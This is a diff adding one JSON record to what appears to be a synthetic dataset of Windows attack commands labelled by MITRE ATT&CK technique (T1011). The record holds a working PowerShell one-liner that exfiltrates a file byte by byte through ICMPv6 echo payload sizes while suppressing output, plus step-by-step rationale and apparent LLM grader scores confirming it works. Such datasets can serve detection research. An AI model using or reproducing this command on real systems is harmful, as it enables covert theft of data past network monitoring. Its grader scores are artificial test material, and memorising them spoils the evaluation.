@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fe80::babe:dead:beef:1%12'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (300 + $_) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Exfiltrates file bytes by encoding each byte into the ICMPv6 payload size using Test-Connection, leveraging ICMP/IPv6 as an alternative medium consistent with T1011.",
+  "rationale_steps": [
+    "Read the file as raw bytes.",
+    "Offset each byte and set it as the ICMP payload length (-BufferSize).",
+    "Send single ICMPv6 echos to a link-local address, suppressing output to reduce visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-b1a1a499",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell is well-formed with balanced quotes/braces, valid parameters, and proper pipelines for Windows PowerShell.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly encodes file bytes into ICMPv6 payload sizes for exfiltration (aligning with Exfiltration Over Alternative Protocol), it does not use a different network medium as required by T1011.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-09-30T23:52:20.639695Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper variable assignment, balanced parentheses, correct method calls, and proper piping of objects through the PowerShell pipeline.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements T1011 by reading a file's bytes and encoding each byte into ICMP packet sizes sent over IPv6 (an alternative network medium), creating a covert exfiltration channel that bypasses standard network monitoring.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-09-30T23:52:25.333747Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct variable assignment, method calls, pipelining, cmdlet usage, valid parameters, and balanced syntax elements.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly reads file bytes, encodes each byte into the ICMPv6 payload size using `Test-Connection -BufferSize`, and transmits it via ICMPv6, aligning perfectly with the claimed intent and T1011 despite the target being a link-local address which restricts the exfiltration to the local network segment.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-09-30T23:52:45.315767Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
